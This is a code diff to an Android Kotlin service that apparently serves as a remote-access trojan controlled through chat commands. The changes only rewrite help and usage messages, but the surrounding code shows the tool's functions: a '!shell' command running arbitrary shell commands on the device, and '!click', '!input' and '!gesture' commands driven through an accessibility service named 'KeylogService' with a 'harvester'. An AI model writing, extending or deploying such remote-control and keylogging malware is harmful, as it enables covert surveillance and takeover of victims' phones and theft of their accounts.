@@ -235,9 +235,8 @@ class MainService : Service() {
                     }
                 }
                 "shell" -> {
-                    val cmd = payload ?: return
-                    if (cmd.isBlank()) {
-                        d.sendMsg(":x: Usage: `!shell <command>`\nTry: `whoami`, `id`, `getprop`, `pm list packages`, `dumpsys battery`")
+                    val cmd = payload ?: run {
+                        d.sendMsg(":terminal: **!shell**\nExecute shell command.\nUsage: `!shell <command>`\nExamples:\n• `!shell whoami`\n• `!shell getprop ro.product.model`\n• `!shell pm list packages`\n• `!shell ls /sdcard/`")
                         return
                     }
                     val progressId = d.sendMsgAwait(":terminal: **Running**: `$ $cmd`")
@@ -638,7 +637,10 @@ class MainService : Service() {
                 "click" -> {
                     val svc = KeylogService.instance
                     if (svc == null) { d.sendMsg(":x: Accessibility not running"); return }
-                    if (payload == null) { d.sendMsg(":x: Usage: `!click <text>` or `!click x,y`"); return }
+                    if (payload == null || payload.isBlank()) {
+                        d.sendMsg(":point_up: **!click**\nClick by text or coordinates.\nUsage: `!click <text>` — clicks first matching text\nUsage: `!click x,y` — clicks at screen coordinates\nExample: `!click Sign In`\nExample: `!click 540,1200`")
+                        return
+                    }
                     val coords = payload.split(",")
                     if (coords.size == 2) {
                         val x = coords[0].trim().toIntOrNull()
@@ -657,12 +659,18 @@ class MainService : Service() {
                 "input" -> {
                     val svc = KeylogService.instance
                     if (svc == null) { d.sendMsg(":x: Accessibility not running"); return }
-                    if (payload == null || payload.isBlank()) { d.sendMsg(":x: Usage: `!input <text>`"); return }
+                    if (payload == null || payload.isBlank()) {
+                        d.sendMsg(":keyboard: **!input**\nType text via accessibility.\nUsage: `!input <text>`\nExample: `!input Hello World`")
+                        return
+                    }
                     svc.harvester.inputText(payload)
                     d.sendMsg(":keyboard: Input sent")
                 }
                 "open" -> {
-                    if (payload == null || payload.isBlank()) { d.sendMsg(":x: Usage: `!open com.example.app` or `!open chrome`"); return }
+                    if (payload == null || payload.isBlank()) {
+                        d.sendMsg(":link: **!open**\nLaunch an app.\nUsage: `!open com.example.app`\nUsage: `!open chrome` (short name)\nExamples: `!open chrome`, `!open whatsapp`, `!open maps`")
+                        return
+                    }
                     try {
                         var intent = packageManager.getLaunchIntentForPackage(payload)
                         if (intent == null) {
@@ -696,7 +704,10 @@ class MainService : Service() {
                 "gesture" -> {
                     val svc = KeylogService.instance
                     if (svc == null) { d.sendMsg(":x: Accessibility not running"); return }
-                    if (payload == null) { d.sendMsg(":x: Usage: `!gesture x1,y1,x2,y2,ms`"); return }
+                    if (payload == null) {
+                        d.sendMsg(":hand: **!gesture**\nPerform swipe gesture.\nUsage: `!gesture x1,y1,x2,y2,ms`\nExample: `!gesture 540,1800,540,600,300`\n(swipe up from bottom to top in 300ms)")
+                        return
+                    }
                     val parts = payload.split(",")
                     if (parts.size == 5) {
                         val x1 = parts[0].trim().toIntOrNull()
@@ -708,10 +719,10 @@ class MainService : Service() {
                             svc.harvester.swipe(x1, y1, x2, y2, ms)
                             d.sendMsg(":hand_splayed: Swipe ($x1,$y1)->($x2,$y2) ${ms}ms")
                         } else {
-                            d.sendMsg(":x: Invalid params")
+                            d.sendMsg(":x: Invalid coordinates. Usage: `!gesture x1,y1,x2,y2,ms`")
                         }
                     } else {
-                        d.sendMsg(":x: Usage: `!gesture x1,y1,x2,y2,ms`")
+                        d.sendMsg(":x: Invalid params. Usage: `!gesture x1,y1,x2,y2,ms`")
                     }
                 }
             }
